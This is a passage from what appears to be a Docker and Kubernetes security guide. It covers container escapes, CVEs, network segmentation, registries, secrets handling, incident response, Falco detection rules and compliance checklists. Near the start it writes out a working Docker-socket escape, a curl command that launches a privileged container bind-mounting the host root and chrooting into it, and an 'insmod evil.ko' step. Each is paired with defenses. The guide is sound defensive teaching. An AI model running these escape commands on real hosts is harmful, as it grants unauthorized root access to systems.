curl -s --unix-socket /var/run/docker.sock   -X POST "http://localhost/containers/create"   -H "Content-Type: application/json"   -d '{"Image":"alpine","Cmd":["chroot","/host","bash"],"Binds":["/:/host"],"Privileged":true}'
```

**Defense:**
- Never mount `/var/run/docker.sock` into containers
- Use kaniko, buildah, or img for container builds in CI
- Monitor with Falco rule: Docker socket accessed from container

### Escape Technique 4: Capability Abuse (CAP_SYS_ADMIN)

```bash
# Check capabilities
capsh --print

# CAP_SYS_ADMIN allows mounting, loading kernel modules
insmod evil.ko

# Or mount-based cgroup escape (same as privileged container technique)
```

**Defense:**
```bash
# Drop ALL capabilities, add only required
docker run --cap-drop=ALL --cap-add=NET_BIND_SERVICE myapp:latest
```

### CVE-2019-5736 — runc Container Escape

**Affected:** runc < 1.0-rc6 (Docker 18.09.1 and earlier)

**Attack:** Overwrites host runc binary by abusing `/proc/self/exe` symlink during `docker exec`. The malicious container replaces the runc binary, and when runc executes again, arbitrary code runs on the host as root.

**Remediation:**
```bash
apt-get update && apt-get upgrade runc containerd
```

**Detection Falco rule:**
```yaml
- rule: Runc escape attempt
  condition: >
    spawned_process and proc.name = runc
    and fd.name startswith /proc/self
  priority: CRITICAL
```

### CVE-2020-15257 — containerd Shim API Exposure

**Affected:** containerd < 1.3.9, 1.4.x < 1.4.3

**Attack:** Containers sharing the host network namespace can connect to the containerd shim abstract Unix socket and elevate privileges.

**Remediation:**
```bash
# Upgrade containerd
apt-get upgrade containerd

# Never use --net=host unless absolutely required
```

### Defense: Pod Security Standards (Restricted Profile)

```yaml
# Namespace-level enforcement
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: v1.28
```

```yaml
# Compliant pod spec (Restricted profile)
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 10000
    seccompProfile:
      type: RuntimeDefault
  containers:
  - name: app
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop: ["ALL"]
    resources:
      limits:
        memory: "512Mi"
        cpu: "500m"
```

---

## 7. Container Networking Security

### Docker Network Modes

| Mode | Flag | Description | Security Risk |
|------|------|-------------|---------------|
| Bridge | `--network bridge` | Default; NAT via docker0 | Inter-container communication enabled by default |
| Host | `--network host` | Shares host network stack | No network isolation; container = host networking |
| None | `--network none` | No networking | Safest; no external connectivity |
| Overlay | `--network overlay` | Multi-host (Swarm) | Encrypted optional; spans hosts |
| Macvlan | `--network macvlan` | Container gets MAC/IP | Bypasses host network stack |
| User-defined bridge | `docker network create` | Custom bridge with DNS | Better isolation than default bridge |

### Default Bridge Network Risks

```bash
# Default bridge (docker0) enables Inter-Container Communication (ICC)
# Any container can communicate with any other container on the same bridge

# Check default bridge settings
docker network inspect bridge | jq '.[0].Options'
# "com.docker.network.bridge.enable_icc": "true"  <- dangerous default

# Disable ICC in daemon.json
# "icc": false

# Verify
docker network inspect bridge | jq '.[0].Options["com.docker.network.bridge.enable_icc"]'
```

### User-Defined Bridge Networks (Recommended)

```bash
# Create isolated user-defined bridge networks
docker network create --driver bridge frontend-net
docker network create --driver bridge backend-net
docker network create --driver bridge db-net

# Connect containers to specific networks only
docker run -d --name web --network frontend-net nginx:alpine
docker run -d --name api --network frontend-net --network backend-net myapi:latest
docker run -d --name db --network db-net postgres:16
```

```yaml
# Docker Compose network segmentation
services:
  web:
    networks: [frontend]
  api:
    networks: [frontend, backend]
  db:
    networks: [backend]
networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true    # No external internet access
```

**Benefits of user-defined networks:**
1. Automatic DNS resolution by container name
2. Better isolation — containers can only reach containers in same network
3. ICC is per-network, not global

### iptables Rules Created by Docker

```bash
# Docker manages these chains automatically:
# DOCKER: port publishing rules
# DOCKER-USER: custom rules (persistent across Docker restarts)
# DOCKER-ISOLATION-STAGE-1: ICC isolation
# DOCKER-ISOLATION-STAGE-2: ICC isolation

# View Docker iptables rules
iptables -L DOCKER
iptables -L DOCKER-USER

# Add persistent custom rules in DOCKER-USER chain
iptables -I DOCKER-USER -i eth0 -j DROP          # Block all external traffic
iptables -I DOCKER-USER -i eth0 -p tcp --dport 443 -j ACCEPT  # Allow only 443

# Block specific container from internet
CONTAINER_IP=$(docker inspect --format='{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' mycontainer)
iptables -I DOCKER-USER -s $CONTAINER_IP -j DROP
```

### Docker Network Encryption (Overlay Networks)

```bash
# Create encrypted overlay network for Swarm
docker network create   --driver overlay   --opt encrypted   --attachable   secure-overlay

# Verify encryption
docker network inspect secure-overlay | jq '.[0].Options'
# "encrypted": "true"

# Encryption uses IPsec ISAKMP (UDP 500) and ESP (IP protocol 50)
# Requires UDP 4789 (VXLAN) and TCP 7946 (cluster management)
```

### Container DNS Security

```bash
# Default Docker DNS: 127.0.0.11 (Docker embedded DNS)
# Containers can resolve each other by name within the same network

# Override DNS for security
docker run --dns 1.1.1.1 --dns 8.8.8.8 myapp:latest

# Disable DNS resolution
docker run --network none myapp:latest

# In daemon.json
# "dns": ["1.1.1.1", "8.8.8.8"]
# "dns-opts": ["ndots:1"]
# "dns-search": []
```

### Network Policy with CNI Plugins

```yaml
# Calico NetworkPolicy: default deny all
apiVersion: projectcalico.org/v3
kind: GlobalNetworkPolicy
metadata:
  name: default-deny
spec:
  selector: all()
  types: [Ingress, Egress]

# Cilium NetworkPolicy: layer 7 HTTP filtering
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-api-only
spec:
  endpointSelector:
    matchLabels:
      app: backend
  ingress:
  - fromEndpoints:
    - matchLabels:
        app: frontend
    toPorts:
    - ports:
      - port: "8080"
        protocol: TCP
      rules:
        http:
        - method: GET
          path: /api/v1/.*
```

### Inter-Container Traffic Inspection

```bash
# Capture traffic between containers
docker run --rm --net container:mycontainer   nicolaka/netshoot tcpdump -i eth0 -w /capture.pcap

# Or use nsenter
CONTAINER_PID=$(docker inspect --format='{{.State.Pid}}' mycontainer)
nsenter -t $CONTAINER_PID -n tcpdump -i eth0
```

---

## 8. Container Registry Security

### Registry Authentication

```bash
# Docker Hub authentication
docker login
echo $PASSWORD | docker login -u username --password-stdin  # Pipe password

# Private registry authentication
docker login myregistry.example.com

# AWS ECR credential helper
apt-get install amazon-ecr-credential-helper
# In ~/.docker/config.json:
# {"credHelpers": {"123456789.dkr.ecr.us-east-1.amazonaws.com": "ecr-login"}}

# GCP Artifact Registry
gcloud auth configure-docker us-central1-docker.pkg.dev

# Inspect stored credentials (base64-encoded, not encrypted without credential helper)
cat ~/.docker/config.json
```

### Registry TLS Requirements

```bash
# Generate TLS certificate for private registry
openssl req -newkey rsa:4096 -nodes -sha256   -keyout /certs/domain.key   -x509 -days 365   -out /certs/domain.crt

# Run registry with TLS
docker run -d   -p 5000:5000   -v /certs:/certs   -e REGISTRY_HTTP_TLS_CERTIFICATE=/certs/domain.crt   -e REGISTRY_HTTP_TLS_KEY=/certs/domain.key   registry:2

# Trust custom CA for Docker
mkdir -p /etc/docker/certs.d/myregistry.example.com:5000
cp ca.crt /etc/docker/certs.d/myregistry.example.com:5000/ca.crt
```

### Harbor — Enterprise Open Source Registry

```bash
helm repo add harbor https://helm.goharbor.io
helm install harbor harbor/harbor   --namespace harbor --create-namespace   --set externalURL=https://registry.example.com   --set expose.tls.enabled=true   --set trivy.enabled=true   --set notary.enabled=true
```

**Harbor Security Features:**

| Feature | Description |
|---------|-------------|
| Trivy Integration | Scan images on push; block deployment if critical vulnerabilities found |
| Image Signing | Cosign/Notary v2 enforcement — reject unsigned images |
| RBAC | System Admin, Project Admin, Developer, Guest roles per project |
| Project Quotas | Storage and image count limits per project |
| Replication | Policy-based replication between registries |
| Webhook | Trigger CI/security workflows on push/scan events |
| Retention Policy | Auto-delete old/untagged images based on rules |
| Immutable Tags | Prevent overwriting existing image tags |

### Notary v2 (notation) — Image Signing

```bash
# Install notation CLI
brew install notation

# Generate signing key
notation cert generate-test --default "mykey"

# Sign an image
notation sign myregistry.io/myimage:v1.0

# Verify signature
notation verify myregistry.io/myimage:v1.0

# Trust policy configuration
cat > ~/.config/notation/trustpolicy.json << 'EOF'
{
  "version": "1.0",
  "trustPolicies": [
    {
      "name": "production-policy",
      "registryScopes": ["myregistry.io/myimage"],
      "signatureVerification": {
        "level": "strict"
      },
      "trustStores": ["ca:my-ca"],
      "trustedIdentities": ["x509.subject: CN=mykey"]
    }
  ]
}
EOF
```

### Supply Chain Security: SLSA for Container Images

**SLSA (Supply-chain Levels for Software Artifacts) levels for containers:**

| Level | Requirements |
|-------|-------------|
| SLSA 1 | Build process documented; provenance generated |
| SLSA 2 | Hosted build service; signed provenance |
| SLSA 3 | Isolated builds; non-falsifiable provenance |
| SLSA 4 | Hermetic builds; two-person review |

```yaml
# GitHub Actions SLSA provenance generation
- uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
  with:
    image: ${{ env.IMAGE }}
    digest: ${{ steps.build.outputs.digest }}
    registry-username: ${{ github.actor }}
  secrets:
    registry-password: ${{ secrets.GITHUB_TOKEN }}
```

```bash
# Attach SBOM provenance attestation with Cosign
syft myimage:latest -o cyclonedx-json > sbom.cdx.json
cosign attest   --predicate sbom.cdx.json   --type cyclonedx   --key cosign.key   myregistry.io/myimage:v1.0

# Verify SBOM attestation
cosign verify-attestation   --type cyclonedx   --key cosign.pub   myregistry.io/myimage:v1.0 | jq '.payload | @base64d | fromjson | .predicate'
```

### Preventing Registry Poisoning

```bash
# 1. Immutable tags: prevent overwriting existing tags
# In Harbor: Project > Configuration > Immutable Artifact Rules
# Add rule: tag matches ** (all tags are immutable after push)

# 2. Image promotion workflow: dev -> staging -> prod
# Each promotion gate includes:
#   - Vulnerability scan (no CRITICAL/HIGH unpatched)
#   - Signature verification
#   - SBOM attestation present
#   - Integration test pass

promote_image() {
  local src_image=$1
  local dst_image=$2

  # Verify signature
  cosign verify --key cosign.pub $src_image || { echo "Signature verification failed"; exit 1; }

  # Scan for vulnerabilities
  trivy image --exit-code 1 --severity CRITICAL $src_image || { echo "Critical vulnerabilities found"; exit 1; }

  # Copy with signature
  cosign copy $src_image $dst_image
  echo "Promoted $src_image to $dst_image"
}

promote_image dev.registry.io/myapp:v1.0 prod.registry.io/myapp:v1.0
```

---

## 9. Secrets in Containers

### Anti-Patterns (Never Do These)

```dockerfile
# DANGER 1: Secret in ENV — visible in docker inspect, docker ps, logs
ENV DATABASE_PASSWORD=mysecretpassword

# DANGER 2: Secret in ARG — baked into image layer history
ARG API_KEY=sk-prod-xxxxxxxxxxxx
RUN curl -H "Authorization: Bearer $API_KEY" https://api.example.com/setup

# DANGER 3: Copying secrets file into image
COPY .env /app/.env
COPY credentials.json /app/credentials.json
```

```bash
# Detect secrets baked into image layers
docker history --no-trunc myimage:latest

# Use dive to explore layers interactively
dive myimage:latest

# Trivy secret scan
trivy image --scanners secret myimage:latest

# ggshield container scan
ggshield secret scan docker myimage:latest
```

### Docker Secrets (Swarm Mode)

```bash
# Create secret
echo "mysecretpassword" | docker secret create db_password -
openssl rand -base64 32 | docker secret create jwt_secret -

# List secrets
docker secret ls

# Use secret in service
docker service create   --name myapp   --secret db_password   --secret source=jwt_secret,target=jwt_key,mode=0400   myapp:latest

# In container: secrets available at /run/secrets/<name>
cat /run/secrets/db_password
```

### BuildKit Secret Mounts

```dockerfile
# syntax=docker/dockerfile:1.6
FROM python:3.12-slim

# Secret mount: NEVER written to image layer
RUN --mount=type=secret,id=pip_token     pip install --index-url "https://$(cat /run/secrets/pip_token)@pypi.example.com/simple" mypackage

# SSH mount for private repositories
RUN --mount=type=ssh     git clone git@github.com:org/private-repo.git /app
```

```bash
# Build with secret
docker build --secret id=pip_token,src=$HOME/.pip_token .

# Build with SSH agent
eval $(ssh-agent)
ssh-add ~/.ssh/id_rsa
docker build --ssh default .
```

### Runtime Secret Injection Patterns

#### 1. Init Container Pattern (Kubernetes)

```yaml
initContainers:
- name: fetch-secrets
  image: vault:latest
  command: ["vault", "agent", "-config=/vault/config/agent.hcl"]
  volumeMounts:
  - name: secrets
    mountPath: /run/secrets
containers:
- name: app
  image: myapp:latest
  volumeMounts:
  - name: secrets
    mountPath: /run/secrets
    readOnly: true
volumes:
- name: secrets
  emptyDir:
    medium: Memory   # tmpfs: not written to disk
```

#### 2. Vault Agent Sidecar Pattern

```yaml
annotations:
  vault.hashicorp.com/agent-inject: "true"
  vault.hashicorp.com/agent-inject-secret-database: "database/creds/myapp"
  vault.hashicorp.com/agent-inject-template-database: |
    {{- with secret "database/creds/myapp" -}}
    DATABASE_URL=postgresql://{{ .Data.username }}:{{ .Data.password }}@db:5432/myapp
    {{- end }}
  vault.hashicorp.com/role: "myapp"
```

#### 3. AWS Secrets Manager via ECS Task Role

```json
{
  "containerDefinitions": [{
    "name": "myapp",
    "secrets": [
      {
        "name": "DATABASE_PASSWORD",
        "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789:secret:prod/myapp/db-pass"
      },
      {
        "name": "API_KEY",
        "valueFrom": "arn:aws:ssm:us-east-1:123456789:parameter/prod/myapp/api-key"
      }
    ]
  }]
}
```

#### 4. CSI Secrets Store Driver

```yaml
apiVersion: secrets-store.csi.x-k8s.io/v1
kind: SecretProviderClass
metadata:
  name: aws-secrets
spec:
  provider: aws
  parameters:
    objects: |
      - objectName: "prod/myapp/db-password"
        objectType: "secretsmanager"
        objectAlias: "db-password"
---
# Pod using CSI driver
volumes:
- name: secrets-store-inline
  csi:
    driver: secrets-store.csi.k8s.io
    readOnly: true
    volumeAttributes:
      secretProviderClass: aws-secrets
```

### Detecting Secrets in Images

```bash
# Trivy secret detection with custom rules
trivy image --scanners secret myimage:latest

# trivy-secret.yaml custom rule
rules:
  - id: custom-api-key
    category: "Custom"
    title: "Company API Key"
    severity: "CRITICAL"
    regex: "COMPANY_[A-Z0-9]{32}"

# ggshield (GitGuardian)
ggshield secret scan docker myimage:latest
ggshield secret scan repo .
```

### Layer Inspection for Secrets

```bash
# View full layer history (shows all RUN commands and their args)
docker history --no-trunc myimage:latest

# Export all layers and search for secrets
docker save myimage:latest > /tmp/image.tar
mkdir /tmp/image-layers && tar -xf /tmp/image.tar -C /tmp/image-layers

# Search all layers for patterns
find /tmp/image-layers -name '*.tar' -exec tar -xOf {} \; 2>/dev/null |   strings | grep -E 'password|secret|key|token|credential' | head -50

# Use crane to inspect manifest and config
crane config myimage:latest | jq '.history[] | select(.created_by | contains("ARG") or contains("ENV"))'
```

---

## 10. Container Security Operations

### SBOM Generation for All Images

```bash
# Syft: comprehensive SBOM generator
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SBOM in various formats
syft myimage:latest -o cyclonedx-json > sbom.cdx.json
syft myimage:latest -o spdx-json > sbom.spdx.json
syft myimage:latest -o table

# Scan SBOM with Grype
grype sbom:sbom.cdx.json

# cdxgen: polyglot SBOM generator
npm install -g @cyclonedx/cdxgen
cdxgen -t docker myimage:latest -o sbom.cdx.json
```

```yaml
# GitHub Actions SBOM workflow
- name: Generate SBOM
  uses: anchore/sbom-action@v0
  with:
    image: myimage:latest
    format: cyclonedx-json
    output-file: sbom.cdx.json

- name: Attach SBOM as release asset
  uses: actions/upload-artifact@v4
  with:
    name: sbom
    path: sbom.cdx.json
```

### Container Inventory Management

```bash
# List all running containers with key metadata
docker ps --format '{{json .}}' | jq '{
  name: .Names,
  image: .Image,
  status: .Status,
  ports: .Ports,
  created: .CreatedAt
}'

# Scan all running containers
for container in $(docker ps -q); do
  image=$(docker inspect --format='{{.Config.Image}}' $container)
  echo "Scanning $container ($image)"
  trivy image --severity CRITICAL $image
done

# Detect containers with dangerous flags
docker ps -q | xargs docker inspect | jq '.[] | select(
  .HostConfig.Privileged == true or
  (.HostConfig.CapAdd // [] | contains(["SYS_ADMIN"])) or
  (.HostConfig.Binds // [] | any(contains("/var/run/docker.sock")))
) | {name: .Name, image: .Config.Image, issue: "Dangerous configuration"}'
```

### Container Lifecycle Policy

```bash
# Never use :latest in production; always pin to specific digest
# Image rotation: remove images older than 30 days
docker image prune -a --filter "until=720h"

# Enforce image age policy
docker images --format '{{.Repository}}:{{.Tag}} {{.CreatedAt}}' |   while read image created; do
    age=$(( ($(date +%s) - $(date -d "$created" +%s)) / 86400 ))
    [ $age -gt 30 ] && echo "OLD IMAGE ($age days): $image"
  done
```

### Incident Response in Containers

```bash
# PHASE 1: Detect and contain
docker ps --format '{{.Names}} {{.Image}} {{.Status}}'
docker stats --no-stream

# Pause container (stop without killing: preserve state for forensics)
docker pause suspicious-container

# Disconnect network first
docker network disconnect bridge suspicious-container

# PHASE 2: Forensic snapshot
# Commit container state (preserve filesystem at time of incident)
docker commit suspicious-container forensic-snapshot:$(date +%Y%m%d-%H%M%S)

# Export full filesystem
docker export suspicious-container > /forensics/container-fs.tar

# Capture process list before pausing
docker top suspicious-container

# Capture network connections
docker exec suspicious-container ss -tunapl 2>/dev/null ||   nsenter -t $(docker inspect --format='{{.State.Pid}}' suspicious-container) -n ss -tunapl

# PHASE 3: Analysis
mkdir /mnt/forensics
tar -xf /forensics/container-fs.tar -C /mnt/forensics

# Check for dropped files, modified binaries
find /mnt/forensics -newer /mnt/forensics/etc/passwd -type f 2>/dev/null
find /mnt/forensics -perm /4000 -type f 2>/dev/null   # SUID files
cat /mnt/forensics/root/.bash_history

# PHASE 4: Log collection
docker logs suspicious-container --since 24h > /forensics/container-logs.txt
```

### Container Log Forwarding

```bash
# Splunk logging driver
docker run -d   --log-driver=splunk   --log-opt splunk-token=$SPLUNK_HEC_TOKEN   --log-opt splunk-url=https://splunk.example.com:8088   --log-opt splunk-index=container-logs   --log-opt splunk-sourcetype=docker   --log-opt splunk-format=json   myapp:latest
```

```json
{
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3",
    "labels": "app,env",
    "env": "HOSTNAME,APP_VERSION"
  }
}
```

```yaml
# Fluent Bit sidecar pattern
services:
  app:
    image: myapp:latest
    logging:
      driver: "fluentd"
      options:
        fluentd-address: localhost:24224
  fluentbit:
    image: fluent/fluent-bit:latest
    volumes:
      - ./fluent-bit.conf:/fluent-bit/etc/fluent-bit.conf
    ports:
      - "24224:24224"
```

### CIS Docker Benchmark v1.6 Compliance Checklist

| Section | Check | Status |
|---------|-------|--------|
| 1.1 | Separate partition for /var/lib/docker | [ ] |
| 1.2 | Hardened container host OS | [ ] |
| 2.1 | Restrict network traffic between containers | [ ] |
| 2.2 | Set logging level to info | [ ] |
| 2.6 | Configure TLS authentication for Docker daemon | [ ] |
| 2.14 | Enable Docker Content Trust | [ ] |
| 3.1-3.22 | Secure Docker files and directories permissions | [ ] |
| 4.1 | Ensure non-root container user | [ ] |
| 4.2 | Use only trusted base images | [ ] |
| 4.4 | Scan images for vulnerabilities | [ ] |
| 4.5 | Enable Docker Content Trust for image pulls | [ ] |
| 4.6 | Add HEALTHCHECK instructions | [ ] |
| 4.9 | Remove SUID/SGID permissions | [ ] |
| 5.1 | Ensure AppArmor profile applied | [ ] |
| 5.2 | Ensure SELinux security options applied | [ ] |
| 5.4 | Ensure privileged containers are not used | [ ] |
| 5.10 | Ensure memory limits are set | [ ] |
| 5.11 | Ensure CPU priority set | [ ] |
| 5.12 | Ensure root filesystem is read-only | [ ] |
| 5.16 | Ensure default seccomp profile not disabled | [ ] |
| 5.17 | Ensure Docker socket not mounted | [ ] |
| 5.21 | Ensure no-new-privileges is set | [ ] |
| 5.28 | Ensure PIDs cgroup limit is used | [ ] |
| 6.1 | Perform regular container image scans | [ ] |
| 6.2 | Avoid image sprawl | [ ] |
| 6.3 | Avoid container sprawl | [ ] |

### MITRE ATT&CK Containers Matrix

| Technique | ID | Description | Detection |
|-----------|-----|-------------|-----------|
| Deploy Container | T1610 | Adversary deploys container to execute code | Falco: Unexpected container started; Audit image pulls |
| Container Escape | T1611 | Escape to host via privileged container or CVE | Falco: Privileged container; seccomp violations; capability abuse |
| Build Image | T1612 | Build malicious image from within environment | Monitor image build events; registry webhooks |
| Container Discovery | T1613 | Enumerate other containers on host | Detect docker CLI usage within containers |
| Resource Hijacking | T1496 | Use containers for cryptomining | CPU/network anomaly detection; Falco miner pool rules |
| Implant Internal Image | T1525 | Implant backdoor into existing container image | Image signing enforcement; registry integrity monitoring |
| Exploit Public-Facing App | T1190 | Exploit vulnerability in containerized app | WAF; Falco network rules; anomalous outbound connections |
| Valid Accounts | T1078 | Use legitimate credentials to access registry | MFA enforcement; access log monitoring; UEBA |

**Detection queries (Falco rules for MITRE techniques):**

```yaml
# T1610: Deploy Container detection
- rule: Unexpected container deployment
  desc: Container started from non-approved image
  condition: >
    container_started and not
    (container.image.repository in (approved_images))
  priority: WARNING
  tags: [T1610, container]

# T1611: Container escape indicators
- rule: Container escape indicators
  desc: Attempts to escape container isolation
  condition: >
    (spawned_process and container and
     proc.name in (nsenter, unshare)) or
    (open_write and container and
     fd.name in (/proc/sysrq-trigger, /proc/sys/kernel/core_pattern))
  priority: CRITICAL
  tags: [T1611, escape]

# T1612: Build image from container
- rule: Docker build from container
  desc: Docker build command executed inside a container
  condition: >
    spawned_process and container and
    proc.name = docker and proc.args contains build
  priority: WARNING
  tags: [T1612, image]

# T1613: Container discovery
- rule: Container discovery from inside container
  desc: Docker commands to list containers/images
  condition: >
    spawned_process and container and
    proc.name = docker and
    (proc.args contains ps or proc.args contains images or proc.args contains inspect)
  priority: NOTICE
  tags: [T1613, discovery]
```

### Complete Container Security CI/CD Pipeline

```yaml
name: Container Security Pipeline

on:
  push:
    branches: [main]
  pull_request:

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
    # 1. Lint Dockerfile
    - name: Lint Dockerfile
      uses: hadolint/hadolint-action@v3.1.0
      with:
        failure-threshold: error

    # 2. Build image
    - name: Build image
      run: docker build -t myapp:${{ github.sha }} .

    # 3. Scan for vulnerabilities
    - name: Vulnerability scan
      uses: aquasecurity/trivy-action@master
      with:
        image-ref: myapp:${{ github.sha }}
        severity: CRITICAL,HIGH
        exit-code: 1
        ignore-unfixed: true
        format: sarif
        output: trivy-results.sarif

    # 4. Upload SARIF to GitHub Security tab
    - name: Upload scan results
      uses: github/codeql-action/upload-sarif@v3
      with:
        sarif_file: trivy-results.sarif

    # 5. Secret scan
    - name: Secret scan
      run: trivy image --scanners secret myapp:${{ github.sha }}

    # 6. SBOM generation
    - name: Generate SBOM
      uses: anchore/sbom-action@v0
      with:
        image: myapp:${{ github.sha }}
        format: cyclonedx-json
        output-file: sbom.cdx.json

    # 7. Sign image (keyless OIDC)
    - name: Install cosign
      uses: sigstore/cosign-installer@v3
    - name: Sign image
      run: cosign sign --yes myregistry.io/myapp:${{ github.sha }}

    # 8. Push to registry
    - name: Push image
      run: docker push myregistry.io/myapp:${{ github.sha }}
```

---

## Quick Reference: Security Checklist

### Dockerfile
- [ ] Non-root USER
- [ ] Pinned base image digest
- [ ] Multi-stage build
- [ ] No secrets in ENV/ARG
- [ ] HEALTHCHECK present
- [ ] .dockerignore configured
- [ ] Minimal base image (distroless/alpine/scratch)

### Runtime
- [ ] `--cap-drop=ALL` + specific `--cap-add`
- [ ] `--read-only` filesystem
- [ ] `--security-opt=no-new-privileges`
- [ ] Memory and CPU limits set
- [ ] `--pids-limit` set
- [ ] No `--privileged`
- [ ] No `--network=host`
- [ ] No `--pid=host`
- [ ] No `/var/run/docker.sock` mount
- [ ] Seccomp profile applied
- [ ] AppArmor profile applied

### Image
- [ ] Vulnerability scan (no CRITICAL/HIGH unpatched)
- [ ] No secrets in layers
- [ ] Image signed (Cosign/notation)
- [ ] SBOM generated and attached
- [ ] Image from trusted registry

### Registry
- [ ] TLS enforced
- [ ] Authentication required
- [ ] Scan on push enabled
- [ ] Immutable tags for production
- [ ] Image signing enforced

### Runtime Monitoring
- [ ] Falco deployed with eBPF driver
- [ ] Alert routing configured (Falco Sidekick)
- [ ] Logs forwarded to SIEM
- [ ] Container inventory monitored

---

## References

- [CIS Docker Benchmark v1.6](https://www.cisecurity.org/benchmark/docker)
- [NIST SP 800-190: Application Container Security Guide](https://csrc.nist.gov/publications/detail/sp/800-190/final)
- [OCI Specifications](https://opencontainers.org/release-notices/v1-0-0/)
- [Falco Documentation](https://falco.org/docs/)
- [Trivy Documentation](https://aquasecurity.github.io/trivy/)
- [Sigstore / Cosign](https://docs.sigstore.dev/)
- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [MITRE ATT&CK Containers Matrix](https://attack.mitre.org/matrices/enterprise/containers/)
- [gVisor Documentation](https://gvisor.dev/docs/)
- [Kata Containers Documentation](https://katacontainers.io/docs/)
- [Harbor Documentation](https://goharbor.io/docs/)
- [Docker Bench for Security](https://github.com/docker/docker-bench-security)
- [Hadolint](https://github.com/hadolint/hadolint)
- [Grype](https://github.com/anchore/grype)
- [Syft](https://github.com/anchore/syft)
